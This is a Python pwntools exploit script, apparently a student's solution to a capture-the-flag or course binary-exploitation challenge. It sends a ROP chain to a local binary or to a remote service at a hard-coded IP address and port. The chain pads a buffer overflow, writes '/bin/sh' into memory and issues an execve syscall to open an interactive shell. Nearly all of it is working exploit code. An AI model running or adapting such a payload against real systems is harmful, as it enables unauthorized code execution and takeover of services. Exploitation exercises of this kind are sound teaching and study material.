
from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        b *vuln+110
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    # p = process("./6")
    context.arch = 'amd64'

    # context.log_level = 'debug'
    p.sendlineafter(b"NIM:", b"13523035")
    p.sendlineafter(b"Challenge:", b"8")

    # LOCAL
    libc_base = 0x00007ffff7dbe000
    system = libc_base + 0x528f0
    binsh = libc_base + 0x1a7e43

    # REMOTE
    # libc_base = 0x00007ffff7d90000
    # system = libc_base + 0x50d70
    # binsh = libc_base + 0x1d8678

    # Gadgets
    # mov qword ptr [rdi], rsi; mov qword ptr [r9 - 8], rcx; ret; 
    # pop rsi; pop rbp; ret;
    pop_rdi = 0x401c89  # used twice for writing /bin/sh and as argument
    mov_rdi_rsi = 0x41eca0
    pop_rsi = 0x40bb92  # used twice
    pop_rdx = 0x401c8b # ret
    pop_rax = 0x42c0cb
    syscall = 0x412be6
    bss_start = 0x4b6b80

    padding = 248
    ret = 0x453939

    payload = flat(
        asm('nop') * padding,
        pop_rsi,
        b"/bin/sh\x00",
        0xdeadbeef, # RBP
        pop_rdi,
        bss_start,
        mov_rdi_rsi,
        pop_rdi,
        bss_start,
        pop_rsi,
        0x0,
        0xdeadbeef,
        pop_rdx,
        0x0,
        pop_rax,
        59,

        syscall,
    )

    with open("payload.bin", "wb") as f:
        f.write(payload)

    # write your payload here
    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()

